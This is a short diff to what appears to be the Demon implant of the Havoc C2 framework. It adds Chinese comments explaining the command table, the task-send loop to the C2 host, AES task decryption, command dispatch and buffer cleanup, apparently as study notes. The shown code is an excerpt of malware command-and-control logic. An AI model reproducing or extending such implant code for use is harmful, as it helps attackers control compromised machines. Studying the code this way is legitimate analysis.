@@ -13,6 +13,7 @@
 #include <Loader/CoffeeLdr.h>
 #include <Inject/Inject.h>
 
+// 用NULL做结束标志
 SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
         { .ID = DEMON_COMMAND_CHECKIN,                  .Function = CommandCheckin                  },
@@ -70,6 +71,7 @@ VOID CommandDispatcher( VOID )
         /* Send our buffer. */
         if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
         {
+            // 没有Host处于存活状态，或者任务发送失败，退出
             CommandExit( NULL );
         }
 
@@ -94,12 +96,15 @@ VOID CommandDispatcher( VOID )
                     PRINTF( "Task => CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", CommandID, CommandID, TaskBuffer, TaskBufferSize )
                     if ( TaskBufferSize != 0 )
                     {
+                        // 解密任务，存在TaskBuffer中
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance.Config.AES.Key, Instance.Config.AES.IV );
                     }
 
+                    // 遍历所有的命令，找到对应的命令ID，执行对应的函数
                     for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ )
                     {
+                        // 退出条件，结构体以NULL结尾
                         if ( DemonCommands[ FunctionCounter ].Function == NULL )
                             break;
 
@@ -113,6 +118,7 @@ VOID CommandDispatcher( VOID )
 
             } while ( Parser.Length > 4 );
 
+            // 释放内存
             MemSet( DataBuffer, 0, DataBufferSize );
             Instance.Win32.LocalFree( *( PVOID* ) DataBuffer );
             DataBuffer = NULL;
